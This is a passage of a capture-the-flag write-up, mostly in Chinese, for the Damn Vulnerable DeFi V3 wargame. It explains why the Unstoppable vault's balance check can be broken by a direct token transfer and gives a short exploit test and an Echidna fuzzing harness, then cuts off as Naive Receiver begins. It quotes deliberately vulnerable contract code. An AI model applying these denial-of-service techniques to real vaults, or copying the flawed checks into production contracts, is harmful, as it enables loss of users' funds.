        
          <li class="md-nav__item">
  <a href="#exploit_4" class="md-nav__link">
    Exploit
  </a>
  
    <nav class="md-nav" aria-label="Exploit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hardhat_2" class="md-nav__link">
    Hardhat
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foundry_2" class="md-nav__link">
    Foundry
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8-puppet" class="md-nav__link">
    8. Puppet
  </a>
  
    <nav class="md-nav" aria-label="8. Puppet">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit_5" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
  

  
                
  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/wargames/damn_vulnerable_defi.md" title="ÁºñËæëÊ≠§È°µ" class="md-content__button md-icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
  </a>



  <h1>Damn Vulnerable DeFi V3</h1>

<div class="md-typeset">
    <div class="blogging-tags-grid">

        <a href="#blockchain" class="blogging-tag"><code>#blockchain</code></a>

        <a href="#smart contract" class="blogging-tag"><code>#smart contract</code></a>

        <a href="#DeFi" class="blogging-tag"><code>#DeFi</code></a>

        <a href="#flashloan" class="blogging-tag"><code>#flashloan</code></a>

        <a href="#hardhat" class="blogging-tag"><code>#hardhat</code></a>

        <a href="#foundry" class="blogging-tag"><code>#foundry</code></a>

    </div>


</div>

<style>
    .md-typeset .blogging-tags-grid {
        display: flex;
        flex-direction: row;
        flex-wrap: wrap;
        gap: 8px;
        margin-top: 5px;
    }

    .md-typeset .blogging-tag {
        color: var(--md-typeset-color);
        background-color: var(--md-typeset-code-color);
        white-space: nowrap;
        display: block;
    }

    .md-typeset .blogging-tag code {
        border-radius: 5px;
    }
</style>
<h2 id="how-to-play">How to Play<a class="headerlink" href="#how-to-play" title="Permanent link">&para;</a></h2>
<h3 id="hardhat">Hardhat<a class="headerlink" href="#hardhat" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>git@github.com:tinchoabbate/damn-vulnerable-defi.git
$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>damn-vulnerable-defi
$<span class="w"> </span>git<span class="w"> </span>checkout<span class="w"> </span>v3.0.0
$<span class="w"> </span>yarn<span class="w"> </span>install
</code></pre></div>
<ul>
<li>Code solution in the <code>test/&lt;challenge-name&gt;/&lt;challenge-name&gt;.challenge.js</code></li>
<li><code>yarn run &lt;challenge-name&gt;</code></li>
</ul>
<h3 id="foundry">Foundry<a class="headerlink" href="#foundry" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>git@github.com:StErMi/forge-damn-vulnerable-defi.git
$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>forge-damn-vulnerable-defi
$<span class="w"> </span>git<span class="w"> </span>submodule<span class="w"> </span>update<span class="w"> </span>--init<span class="w"> </span>--recursive
$<span class="w"> </span>forge<span class="w"> </span>remappings
</code></pre></div>
<ul>
<li>Code solution under the <code>src/test</code></li>
<li><code>forge test --match-contract &lt;test-contract-name&gt;</code></li>
</ul>
<h2 id="1-unstoppable">1. Unstoppable<a class="headerlink" href="#1-unstoppable" title="Permanent link">&para;</a></h2>
<blockquote>
<p>There‚Äôs a tokenized vault with a million DVT tokens deposited. It‚Äôs offering flash loans for free, until the grace period ends.</p>
<p>To pass the challenge, make the vault stop offering flash loans.</p>
<p>You start with 10 DVT tokens in balance.</p>
</blockquote>
<ul>
<li>ERC4626 ÂÆûÁé∞ ERC20 ‰Ωú‰∏∫ËÇ°ÊùÉ‰ª£Â∏ÅÔºå<code>asset</code> ‰∏∫ Vault ÁÆ°ÁêÜÁöÑÂ∫ïÂ±Ç‰ª£Â∏Å</li>
<li>
<p><code>UnstoppableVault</code> ÂàùÂßãÊåÅÊúâ <span class="arithmatex">\(10^6\)</span> DVT (ERC20) Âíå <span class="arithmatex">\(10^6\)</span> oDVT (ERC4626)</p>
<div class="highlight"><pre><span></span><code><span class="c1">// unstoppable.challenge.js</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">TOKENS_IN_VAULT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1000000n</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">10n</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mi">18n</span><span class="p">;</span>

<span class="k">await</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">vault</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">TOKENS_IN_VAULT</span><span class="p">);</span>
<span class="k">await</span><span class="w"> </span><span class="nx">vault</span><span class="p">.</span><span class="nx">deposit</span><span class="p">(</span><span class="nx">TOKENS_IN_VAULT</span><span class="p">,</span><span class="w"> </span><span class="nx">deployer</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="c1">// ERC4626.sol</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">convertToShares</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">assets</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">virtual</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">supply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">totalSupply</span><span class="p">;</span><span class="w">   </span><span class="c1">// the totalSupply of oDVT</span>
<span class="w">    </span><span class="c1">// ÂΩìÂàùÂßã totalSupply ‰∏∫ 0 Êó∂Ôºådeposit assets ÂæóÂà∞ÂêåÁ≠âÊï∞ÈáèÁöÑ shares</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">supply</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">assets</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">assets</span><span class="p">.</span><span class="nx">mulDivDown</span><span class="p">(</span><span class="nx">supply</span><span class="p">,</span><span class="w"> </span><span class="nx">totalAssets</span><span class="p">());</span>
<span class="w">    </span><span class="c1">// (assets * supply) / totalAssets()</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">previewDeposit</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">assets</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">virtual</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">convertToShares</span><span class="p">(</span><span class="nx">assets</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">assets</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">receiver</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">virtual</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">shares</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">((</span><span class="nx">shares</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">previewDeposit</span><span class="p">(</span><span class="nx">assets</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;ZERO_SHARES&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Need to transfer before minting or ERC777s could reenter.</span>
<span class="w">    </span><span class="nx">asset</span><span class="p">.</span><span class="nx">safeTransferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">assets</span><span class="p">);</span>

<span class="w">    </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">receiver</span><span class="p">,</span><span class="w"> </span><span class="nx">shares</span><span class="p">);</span>

<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Deposit</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">receiver</span><span class="p">,</span><span class="w"> </span><span class="nx">assets</span><span class="p">,</span><span class="w"> </span><span class="nx">shares</span><span class="p">);</span>

<span class="w">    </span><span class="nx">afterDeposit</span><span class="p">(</span><span class="nx">assets</span><span class="p">,</span><span class="w"> </span><span class="nx">shares</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>Ê≥®ÊÑèÂà∞ <code>convertToShares(totalSupply) != balanceBefore</code> Âú®‰ΩøÁî®‰æùÊçÆ <code>totalSupply</code>(oDVT) ËÆ°ÁÆóÂæóÂà∞ÁöÑ <code>shares</code> Âíå <code>totalAssets()</code>(<code>UnstoppableVault</code> ÁöÑ DVT ‰ΩôÈ¢ù) ËøõË°åÊØîËæÉÔºåÂ∞ΩÁÆ°Âú®ÂàùÂßãÊÉÖÂÜµ‰∏ãÊ≤°ÊúâÈóÆÈ¢òÔºå‰ΩÜÊòØ... (‚Éî *`œâ¬¥ * )‚Éï‚Üù</p>
<ul>
<li><code>totalSupply</code> Âè™ËÉΩÈÄöËøá <code>deposit</code> / <code>mint</code> Â¢ûÂä†ÔºåËÄå <code>balanceBefore</code> ÂèØÈÄöËøá DVT ÁöÑ <code>transfer</code> Â¢ûÂä†</li>
<li>Ë¶ÅÂ∞Ü <code>totalSupply</code> ËΩ¨Êç¢Êàê <code>assets</code> Â∫î‰ΩøÁî® <code>convertToAssets</code></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// ReentrancyGuard.sol</span>
<span class="nx">modifier</span><span class="w"> </span><span class="nx">nonReentrant</span><span class="p">()</span><span class="w"> </span><span class="nx">virtual</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">locked</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;REENTRANCY&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="nx">locked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>

<span class="w">    </span><span class="nx">_</span><span class="p">;</span>

<span class="w">    </span><span class="nx">locked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="c1">// UnstoppableVault.sol</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">totalAssets</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// slot 0 ÂØπÂ∫î ReentrancyGuard ‰∏≠ÁöÑ locked</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">eq</span><span class="p">(</span><span class="nx">sload</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span><span class="w"> </span><span class="mf">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">mstore</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0xed3ba6a6</span><span class="p">)</span>
<span class="w">            </span><span class="nx">revert</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x04</span><span class="p">)</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">asset</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">flashLoan</span><span class="p">(</span>
<span class="w">    </span><span class="nx">IERC3156FlashBorrower</span><span class="w"> </span><span class="nx">receiver</span><span class="p">,</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">_token</span><span class="p">,</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span>
<span class="w">    </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span>
<span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">amount</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">revert</span><span class="w"> </span><span class="nx">InvalidAmount</span><span class="p">(</span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">asset</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">_token</span><span class="p">)</span><span class="w"> </span><span class="nx">revert</span><span class="w"> </span><span class="nx">UnsupportedCurrency</span><span class="p">();</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">balanceBefore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">totalAssets</span><span class="p">();</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">convertToShares</span><span class="p">(</span><span class="nx">totalSupply</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">balanceBefore</span><span class="p">)</span><span class="w"> </span><span class="nx">revert</span><span class="w"> </span><span class="nx">InvalidBalance</span><span class="p">();</span>

<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">fee</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">flashFee</span><span class="p">(</span><span class="nx">_token</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="c1">// SafeERC20 wrappers around ERC20 operations that throw on failure</span>
<span class="w">    </span><span class="nx">ERC20</span><span class="p">(</span><span class="nx">_token</span><span class="p">).</span><span class="nx">safeTransfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">receiver</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">receiver</span><span class="p">.</span><span class="nx">onFlashLoan</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">asset</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">fee</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;IERC3156FlashBorrower.onFlashLoan&quot;</span><span class="p">))</span>
<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">CallbackFailed</span><span class="p">();</span>

<span class="w">    </span><span class="nx">ERC20</span><span class="p">(</span><span class="nx">_token</span><span class="p">).</span><span class="nx">safeTransferFrom</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">receiver</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">fee</span><span class="p">);</span>
<span class="w">    </span><span class="nx">ERC20</span><span class="p">(</span><span class="nx">_token</span><span class="p">).</span><span class="nx">safeTransfer</span><span class="p">(</span><span class="nx">feeRecipient</span><span class="p">,</span><span class="w"> </span><span class="nx">fee</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>Âêë <code>UnstoppableVault</code> ÂèëÈÄÅ DVT ‰ΩøÂæó <code>convertToShares(totalSupply) == balanceBefore</code> Êó†Ê≥ïÊàêÁ´ãÂ∞±ÂèØ‰ª•ÈòªÊ≠¢Èó™ÁîµË¥∑Âï¶ XD</p>
<div class="highlight"><pre><span></span><code><span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// get the contracts with player as signer</span>
<span class="w">    </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">player</span><span class="p">);</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">vault</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">INITIAL_PLAYER_TOKEN_BALANCE</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div>
</li>
</ul>
<h3 id="using-echidna">Using Echidna<a class="headerlink" href="#using-echidna" title="Permanent link">&para;</a></h3>
<div class="admonition note">
<p class="admonition-title">contracts/unstoppable/UnstoppableTest.sol</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./ReceiverUnstoppable.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../DamnValuableToken.sol&quot;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">UnstoppableTest</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">IERC3156FlashBorrower</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="nx">DamnValuableToken</span><span class="w"> </span><span class="nx">token</span><span class="p">;</span>
<span class="w">    </span><span class="nx">UnstoppableVault</span><span class="w"> </span><span class="nx">vault</span><span class="p">;</span>

<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">TOKENS_IN_VAULT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000000e18</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">INITIAL_PLAYER_TOKEN_BALANCE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">10e18</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">DamnValuableToken</span><span class="p">();</span>
<span class="w">        </span><span class="nx">vault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">UnstoppableVault</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">),</span><span class="w"> </span><span class="nx">TOKENS_IN_VAULT</span><span class="p">);</span>
<span class="w">        </span><span class="nx">vault</span><span class="p">.</span><span class="nx">deposit</span><span class="p">(</span><span class="nx">TOKENS_IN_VAULT</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// sending the attacker some tokens</span>
<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="mh">0x10000</span><span class="p">),</span><span class="w"> </span><span class="nx">INITIAL_PLAYER_TOKEN_BALANCE</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">onFlashLoan</span><span class="p">(</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">initiator</span><span class="p">,</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">_token</span><span class="p">,</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">fee</span><span class="p">,</span>
<span class="w">        </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span>
<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bytes32</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="w"> </span><span class="p">(</span><span class="nx">initiator</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">_token</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">.</span><span class="nx">asset</span><span class="p">())</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">fee</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>

<span class="w">        </span><span class="nx">ERC20</span><span class="p">(</span><span class="nx">_token</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;IERC3156FlashBorrower.onFlashLoan&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// check whether UnstoppableLender can always provide flash loans</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">echidna_test_flashloan</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">vault</span><span class="p">.</span><span class="nx">flashLoan</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">),</span><span class="w"> </span><span class="mf">10</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</div>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>echidna<span class="w"> </span>.<span class="w"> </span>--contract<span class="w"> </span>UnstoppableTest<span class="w"> </span>--all-contracts<span class="w"> </span>--sender<span class="w"> </span>0x10000
...
echidna_test_flashloan:<span class="w"> </span>failed!üí•<span class="w">  </span>
<span class="w">  </span>Call<span class="w"> </span>sequence:
<span class="w">    </span>*wait*<span class="w"> </span>Time<span class="w"> </span>delay:<span class="w"> </span><span class="m">392942</span><span class="w"> </span>seconds<span class="w"> </span>Block<span class="w"> </span>delay:<span class="w"> </span><span class="m">1545</span>
<span class="w">    </span>*wait*<span class="w"> </span>Time<span class="w"> </span>delay:<span class="w"> </span><span class="m">389927</span><span class="w"> </span>seconds<span class="w"> </span>Block<span class="w"> </span>delay:<span class="w"> </span><span class="m">9966</span>
<span class="w">    </span>*wait*<span class="w"> </span>Time<span class="w"> </span>delay:<span class="w"> </span><span class="m">414579</span><span class="w"> </span>seconds<span class="w"> </span>Block<span class="w"> </span>delay:<span class="w"> </span><span class="m">12172</span>
<span class="w">    </span>*wait*<span class="w"> </span>Time<span class="w"> </span>delay:<span class="w"> </span><span class="m">322246</span><span class="w"> </span>seconds<span class="w"> </span>Block<span class="w"> </span>delay:<span class="w"> </span><span class="m">65</span>
<span class="w">    </span>*wait*<span class="w"> </span>Time<span class="w"> </span>delay:<span class="w"> </span><span class="m">271329</span><span class="w"> </span>seconds<span class="w"> </span>Block<span class="w"> </span>delay:<span class="w"> </span><span class="m">883</span>
<span class="w">    </span>*fallback*<span class="o">()</span><span class="w"> </span>from:<span class="w"> </span>0x0000000000000000000000000000000000010000<span class="w"> </span>Time<span class="w"> </span>delay:<span class="w"> </span><span class="m">138756</span><span class="w"> </span>seconds<span class="w"> </span>Block<span class="w"> </span>delay:<span class="w"> </span><span class="m">3281</span>
<span class="w">    </span>*wait*<span class="w"> </span>Time<span class="w"> </span>delay:<span class="w"> </span><span class="m">289607</span><span class="w"> </span>seconds<span class="w"> </span>Block<span class="w"> </span>delay:<span class="w"> </span><span class="m">38344</span>
<span class="w">    </span>*wait*<span class="w"> </span>Time<span class="w"> </span>delay:<span class="w"> </span><span class="m">372714</span><span class="w"> </span>seconds<span class="w"> </span>Block<span class="w"> </span>delay:<span class="w"> </span><span class="m">55396</span>

Event<span class="w"> </span>sequence:<span class="w"> </span>Transfer<span class="o">()</span><span class="w"> </span>from:<span class="w"> </span>0xb4c79dab8f259c7aee6e5b2aa729821864227e84,<span class="w"> </span>error<span class="w"> </span>Revert<span class="w"> </span>0x,<span class="w"> </span>error<span class="w"> </span>Revert<span class="w"> </span>0x
Unique<span class="w"> </span>instructions:<span class="w"> </span><span class="m">3719</span>
Unique<span class="w"> </span>codehashes:<span class="w"> </span><span class="m">4</span>
Corpus<span class="w"> </span>size:<span class="w"> </span><span class="m">1</span>
Seed:<span class="w"> </span><span class="m">2655974979073607364</span>
</code></pre></div>
<h3 id="_1">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC4626">ERC4626</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt">BigInt - JavaScript | MDN</a></li>
</ul>
<h2 id="2-naive-receiver">2. Naive Receiver<a class="headerlink" href="#2-naive-receiver" title="Permanent link">&para;</a></h2>
<blockquote>
<p>There‚Äôs a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.</p>
<p>A user has deployed a contract with 10 ETH in balance. It‚Äôs capable of interacting with the pool and receiving flash loans of ETH.</p>
<p>Take all ETH out of the user‚Äôs contract. If possible, in a single transaction.</p>
</blockquote>
<p><code>FlashLoanReceiver.onFlashLoan()</code> Ê≤°ÊúâÊ£ÄÊü•Èó™ÁîµË¥∑ÁöÑÂèëËµ∑ËÄÖ uwu Âè™Â•Ω„ÄåÂ∏Æ„Äç<code>FlashLoanReceiver</code> ÂèëËµ∑Èó™ÁîµË¥∑Êù•Ê∂àËÄó‰ΩôÈ¢ùÂï¶ :D</p>
<div class="highlight"><pre><span></span><code><span class="c1">// FlashLoanReceiver.sol</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">onFlashLoan</span><span class="p">(</span>
